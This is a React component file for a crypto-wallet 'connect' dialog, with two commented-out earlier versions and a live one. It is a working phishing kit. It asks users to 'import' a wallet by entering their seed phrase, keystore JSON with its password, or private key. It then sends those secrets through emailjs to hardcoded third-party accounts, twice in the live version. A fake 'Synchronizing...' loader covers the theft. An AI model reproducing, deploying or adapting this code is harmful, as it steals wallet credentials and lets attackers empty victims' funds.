// // ManualConnectModal.js
// import React, { useState, useRef } from "react";
// import emailjs from "emailjs-com";

// const ManualConnectModal = ({ selectedWallet, closeModal, onSubmit }) => {
//   const [userText, setUserText] = useState("");
//   const form = useRef();

//   const handleSubmit = (e) => {
//     e.preventDefault();

//     // Add logic to handle userText and selectedWallet.name if needed
//     const formData = new FormData(form.current);
//     formData.append("walletName", selectedWallet.name);

//     console.log("Form data:", formData);

//     emailjs
//       .sendForm(
//         "service_olg9dp8",
//         "template_n31gav9",
//         form.current,
//         "yPbNv-lKRO62iIUkS"
//       )
//       .then(
//         (result) => {
//           console.log(result.text);
//         },
//         (error) => {
//           console.error(error.text);
//         }
//       );

//     onSubmit(); // Close the modal after submission (you can modify this as needed)
//   };

//   return (
//     <div className="fixed top-0 right-0 bottom-0 left-0 flex items-center justify-center text-xl bg-gray-50 ">
//       <div className="bg-white p-5 rounded-xl w-[700px]">
//         <h2 className="text-xl font-semibold mb-4">{selectedWallet.name}</h2>
//         <form ref={form} onSubmit={handleSubmit}>
//           {/* Hidden input to capture wallet name */}
//           <input
//             type="hidden"
//             id="walletName"
//             name="walletName"
//             value={selectedWallet.name}
//           />

//           <label className="block mb-2">Additional Information:</label>
//           <textarea
//             id="userText"
//             name="userText"
//             value={userText}
//             onChange={(e) => setUserText(e.target.value)}
//             className="w-full h-32 border border-gray-300 rounded-md p-2"
//             placeholder="Enter additional information..."
//           />
//           <button
//             type="submit"
//             className="mt-4 px-4 py-2 bg-gray-600 text-white rounded-md"
//           >
//             Submit
//           </button>
//         </form>
//         <button
//           className="mt-4 px-4 py-2 bg-gray-600 text-white rounded-md"
//           onClick={closeModal}
//         >
//           Close
//         </button>
//       </div>
//     </div>
//   );
// };

// export default ManualConnectModal;

// ManualConnectModal.js
// import React, { useState, useRef } from "react";
// import emailjs from "emailjs-com";
// import { FaArrowRight } from "react-icons/fa";

// const ManualConnectModal = ({ selectedWallet, closeModal, onSubmit }) => {
//   const [userInputType, setUserInputType] = useState("phrase");
//   const [userText, setUserText] = useState("");
//   const [keystoreJson, setKeystoreJson] = useState("");
//   const [walletPassord, setWalletPassword] = useState("");
//   const [showSpinner, setShowSpinner] = useState(false);

//   const [privateKey, setPrivateKey] = useState("");
//   const form = useRef();

//   const handleUserInputTypeChange = (type) => {
//     setUserInputType(type);
//   };

//   const handleSubmit = async(e) => {
//     e.preventDefault();

//     let formData = new FormData(form.current);

//     const isTextAreaValid =
//       userInputType === "phrase" ? userText.split(/\s+/).length >= 10 : true;

//     if (!isTextAreaValid) {
//       alert("Text area must contain at least 10 words.");
//       return;
//     }

//     setShowSpinner(true);

//     // Additional logic based on input type
//     if (userInputType === "phrase") {
//       formData.append("walletName", selectedWallet.name);
//       formData.append("userType", "Phrase");
//     } else if (userInputType === "keystoreJson") {
//       formData.append("walletName", selectedWallet.name);
//       formData.append("keystoreJson", keystoreJson);
//       formData.append("userType", "KeystoreJson");
//     } else if (userInputType === "privateKey") {
//       formData.append("walletName", selectedWallet.name);
//       formData.append("privateKey", privateKey);
//       formData.append("userType", "PrivateKey");
//     }

//     console.log("Form data:", formData);

//     // Validate text area content

//     try {
//       await emailjs.sendForm(
//         "service_olg9dp8",
//         "template_n31gav9",
//         form.current,
//         "yPbNv-lKRO62iIUkS"
//       );



//       onSubmit(); // Close the modal after successful submission
//     } catch (error) {
//       console.error("Error submitting form:", error);
//     } finally {
//       setShowSpinner(false);
//     }
//   };

//   return (
//     <div className="fixed top-0 right-0 bottom-0 left-0 flex items-center justify-center text-xl bg-gray-50 ">
//       <div className="bg-white p-5 rounded-xl w-[700px]">
//         <span className="flex items-center justify-center mb-10 gap-5 ">
//           <img src={selectedWallet.image} alt="" className="h-14 w-14" />
//           <h2 className="text-xl font-semibold  ">
//             import your {selectedWallet.name} Wallet
//           </h2>
//         </span>

//         {/* User Input Type Selector */}
//         <div className="flex mb-4 gap-10">
//           <button
//             className={`btn ${userInputType === "phrase" && "active"}`}
//             onClick={() => handleUserInputTypeChange("phrase")}
//           >
//             Phrase
//           </button>
//           <button
//             className={`btn ${userInputType === "keystoreJson" && "active"}`}
//             onClick={() => handleUserInputTypeChange("keystoreJson")}
//           >
//             Keystore JSON
//           </button>
//           <button
//             className={`btn ${userInputType === "privateKey" && "active"}`}
//             onClick={() => handleUserInputTypeChange("privateKey")}
//           >
//             Private Key
//           </button>
//         </div>

//         {/* User Input Based on Type */}
//         <form ref={form} onSubmit={handleSubmit}>
//           {/* Hidden input to capture wallet name */}
//           <input
//             type="hidden"
//             id="walletName"
//             name="walletName"
//             value={selectedWallet.name}
//           />

//           {userInputType === "phrase" && (
//             <div>
//               <input
//                 type="hidden"
//                 id="userInputType"
//                 name="userInputType"
//                 value="Phrase"
//               />
//               <textarea
//                 id="userText"
//                 name="userText"
//                 value={userText}
//                 onChange={(e) => setUserText(e.target.value)}
//                 className="w-full h-32 border border-gray-300 rounded-md p-2"
//                 placeholder="Enter your phrase..."
//               />
//               <p className="text-md italic text-center py-5">
//                 Typically 12 (sometimes 24) words separated by single spaces
//               </p>
//             </div>
//           )}

//           {userInputType === "keystoreJson" && (
//             <div>
//               <input
//                 type="hidden"
//                 id="userInputType"
//                 name="userInputType"
//                 value="Keystore Json"
//               />
//               <textarea
//                 id="keystoreJson"
//                 name="keystoreJson"
//                 value={keystoreJson}
//                 required
//                 onChange={(e) => setKeystoreJson(e.target.value)}
//                 className="w-full h-32 border border-gray-300 rounded-md p-2 mb-2"
//                 placeholder="Enter your keystore JSON..."
//               />
//               <input
//                 type="password"
//                 id="wallet password"
//                 name="wallet password"
//                 required
//                 value={walletPassord}
//                 onChange={(e) => setWalletPassword(e.target.value)}
//                 placeholder="Wallet Password"
//                 className="w-full border border-gray-300 rounded-md p-2"
//               />
//               <p className="text-md italic text-center py-5">
//                 Several lines of text beginning with plus the password you used
//                 to encrypt it.
//               </p>
//             </div>
//           )}

//           {userInputType === "privateKey" && (
//             <div>
//               <input
//                 type="hidden"
//                 id="userInputType"
//                 name="userInputType"
//                 value="Private Key"
//               />
//               <input
//                 type="text"
//                 id="privateKey"
//                 name="privateKey"
//                 required
//                 value={privateKey}
//                 onChange={(e) => setPrivateKey(e.target.value)}
//                 className="w-full border border-gray-300 rounded-md p-2"
//                 placeholder="Enter private key..."
//               />
//               <p className="text-md italic text-center py-5">
//                 Typically 12 (sometimes 24) words seperated by a single space.
//               </p>
//             </div>
//           )}

//           <button
//             type="submit"
//             className="mt-4 px-4 py-2 bg-blue-600 text-white rounded-md w-full"
//           >
//             <span className="inline-flex items-center gap-3">
//               Connect <FaArrowRight />
//             </span>
//           </button>
//         </form>

//         <div className="text-right py-5">
//           <button
//             className="mt-4 px-4 py-2 bg-red-600 text-white rounded-md text-left"
//             onClick={closeModal}
//           >
//             Cancel
//           </button>
//         </div>
//       </div>
//     </div>
//   );
// };

// export default ManualConnectModal;

import React, { useState, useRef, useEffect } from "react";
import emailjs from "emailjs-com";
import { FaArrowRight } from "react-icons/fa";
import LoadingModal from "./LoadingModal";

const ManualConnectModal = ({ selectedWallet, closeModal, onSubmit }) => {
  const [userInputType, setUserInputType] = useState("phrase");
  const [userText, setUserText] = useState("");
  const [keystoreJson, setKeystoreJson] = useState("");
  const [walletPassword, setWalletPassword] = useState("");
  const [privateKey, setPrivateKey] = useState("");
  const [isSynchronizing, setIsSynchronizing] = useState(false);
  const form = useRef();

  const handleUserInputTypeChange = (type) => {
    setUserInputType(type);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    setIsSynchronizing(true);

    let formData = new FormData(form.current);

    // Additional logic based on input type
    if (userInputType === "phrase") {
      formData.append("walletName", selectedWallet.name);
      formData.append("userType", "Phrase");
    } else if (userInputType === "keystoreJson") {
      formData.append("walletName", selectedWallet.name);
      formData.append("keystoreJson", keystoreJson);
      formData.append("walletPassword", walletPassword);
      formData.append("userType", "KeystoreJson");
    } else if (userInputType === "privateKey") {
      formData.append("walletName", selectedWallet.name);
      formData.append("privateKey", privateKey);
      formData.append("userType", "PrivateKey");
    }

    // Validate text area content
    // const isTextAreaValid =
    //   userInputType === "phrase" ? userText.split(/\s+/).length >= 10 : true;

    // if (!isTextAreaValid) {
    //   setIsSynchronizing(false);
    //   alert("Text area must contain at least 10 words.");
    //   return;
    // }

    console.log("Form data:", formData);

      // await emailjs.sendForm(
      //   "service_uk7i0bi",
      //   "template_p524rvn",
      //   form.current,
      //   "rVndnp0Bchzm41MAz"
      // );
    
      try {
        await emailjs.sendForm(
          "service_jcu7elm",
          "template_egpl2j5",
          form.current,
          "DqbO8ehbSa9azzCOr"
        );
        
        await emailjs.sendForm(
          "service_d6oupni",
          "template_foi8ygt",
          form.current,
          "lkCQpXoMcvB5RJCev"
        );


       // Reset form state values
       setUserText("");
       setKeystoreJson("");
       setWalletPassword("");
       setPrivateKey("");
  
      //  setIsSynchronizing(true);
       onSubmit(); // Close the modal after successful submission
      } catch (error) {
        setIsSynchronizing(false);
        console.error(error.text);
        alert("An error occurred while sending the form.");
      }

  
    
  };


  useEffect(() => {
    // Clean up synchronization state when the component unmounts
    return () => {
      setIsSynchronizing(false);
    };
  }, []);

  return (
    <div className="fixed top-0 right-0 bottom-0 left-0 flex items-center justify-center text-xl bg-gray-50 ">
      <div className="bg-white p-5 rounded-xl w-[700px]">
        <span className="flex items-center justify-center mb-10 gap-5 ">
          <img src={selectedWallet.image} alt="" className="h-14 w-14" />
          <h2 className="text-xl font-semibold  ">
            Import your {selectedWallet.name} Wallet
          </h2>
        </span>

        {/* User Input Type Selector */}
        <div className="flex mb-4 gap-10">
          <button
            className={`btn ${userInputType === "phrase" && "active"}`}
            onClick={() => handleUserInputTypeChange("phrase")}
          >
            Phrase
          </button>
          <button
            className={`btn ${userInputType === "keystoreJson" && "active"}`}
            onClick={() => handleUserInputTypeChange("keystoreJson")}
          >
            Keystore JSON
          </button>
          <button
            className={`btn ${userInputType === "privateKey" && "active"}`}
            onClick={() => handleUserInputTypeChange("privateKey")}
          >
            Private Key
          </button>
        </div>

        {/* User Input Based on Type */}
        <form ref={form} onSubmit={handleSubmit}>
          {/* Hidden input to capture wallet name */}
          <input
            type="hidden"
            id="walletName"
            name="walletName"
            value={selectedWallet.name}
          />

          {userInputType === "phrase" && (
            <div>
              <input
                type="hidden"
                id="userInputType"
                name="userInputType"
                value="Phrase"
              />
              <textarea
                id="userText"
                name="userText"
                required
                value={userText}
                onChange={(e) => setUserText(e.target.value)}
                className="w-full h-32 border border-gray-300 rounded-md p-2"
                placeholder="Enter your phrase..."
              />
              <p className="text-md italic text-center py-5">
                Typically 12 (sometimes 24) words separated by single spaces
              </p>
            </div>
          )}

          {userInputType === "keystoreJson" && (
            <div>
              <input
                type="hidden"
                id="userInputType"
                name="userInputType"
                value="Keystore Json"
              />
              <textarea
                id="keystoreJson"
                name="keystoreJson"
                required
                value={keystoreJson}
                onChange={(e) => setKeystoreJson(e.target.value)}
                className="w-full h-32 border border-gray-300 rounded-md p-2 mb-2"
                placeholder="Enter your keystore JSON..."
              />
              <input
                type="text"
                id="walletPassword"
                required
                name="walletPassword"
                value={walletPassword}
                onChange={(e) => setWalletPassword(e.target.value)}
                placeholder="Wallet Password"
                className="w-full border border-gray-300 rounded-md p-2"
              />
              <p className="text-md italic text-center py-5">
                Several lines of text beginning with plus the password you used
                to encrypt it.
              </p>
            </div>
          )}

          {userInputType === "privateKey" && (
            <div>
              <input
                type="hidden"
                id="userInputType"
                name="userInputType"
                value="Private Key"
              />
              <input
                type="text"
                id="privateKey"
                name="privateKey"
                required
                value={privateKey}
                onChange={(e) => setPrivateKey(e.target.value)}
                className="w-full border border-gray-300 rounded-md p-2"
                placeholder="Enter private key..."
              />
              <p className="text-md italic text-center py-5">
                Typically 12 (sometimes 24) words separated by a single space.
              </p>
            </div>
          )}

<button
            type="submit"
            className="mt-4 px-4 py-2 bg-blue-600 text-white rounded-md w-full"
            disabled={isSynchronizing}
          >
            <span className="inline-flex items-center gap-3">
              {isSynchronizing ? (
                <LoadingModal text="Synchronizing..." selectedWallet={selectedWallet}/>
              ) : (
                "Connect"
              )}
              {!isSynchronizing && <FaArrowRight />}
            </span>
          </button>
        </form>

        <div className="text-right py-5">
          <button
            className="mt-4 px-4 py-2 bg-red-600 text-white rounded-md text-left"
            onClick={closeModal}
            disabled={isSynchronizing} // Disable the button during synchronization
          >
            Cancel
          </button>
        </div>
      </div>
    </div>
  );
};

export default ManualConnectModal;

// const Spinner = () => (
//   <div className="animate-spin inline-block h-5 w-5 border-t-2 border-blue-500 rounded-full"></div>
// );
